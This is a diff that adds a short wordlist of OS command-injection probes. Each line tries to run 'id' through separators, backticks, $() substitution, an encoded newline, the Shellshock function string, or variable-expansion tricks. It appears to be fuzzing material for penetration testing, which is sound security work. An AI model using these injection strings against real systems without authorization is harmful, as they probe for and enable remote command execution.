@@ -1,0 +1,57 @@
+;id;
+|id
+|id|
+;id
+||id
+|id;
+||id;
+;id|
+`id`
+a;id
+a;id;
+a;id|
+a|id
+&id&
+| id
+& id
+; id
+$;id
+$(`id`)
+|| id;
+ ||id;
+ || id
+ |id;
+| id;
+ | id
+&&id;
+&&id
+ &&id;
+&& id;
+ && id
+&id;
+ &id;
+& id;
+ & id
+ %0A id
+`id` # ``
+$(id)
+() { :;}; id
+||`id`
+;${id};
+;'`id`';
+& id &
+&&CMD=$'id';$CMD
+&&CMD=$"id";$CMD
+&&id&&
+&CMD=$'id';$CMD
+CMD=$"id";$CMD
+;CMD=$'id';$CMD
+;CMD=$"id";$CMD
+CMD=$'id';$CMD
+CMD=$"id";$CMD
+||CMD=$'id';$CMD
+||CMD=$"id";$CMD
+||id
+|CMD=$'id';$CMD
+|CMD=$"id";$CMD
+||id|
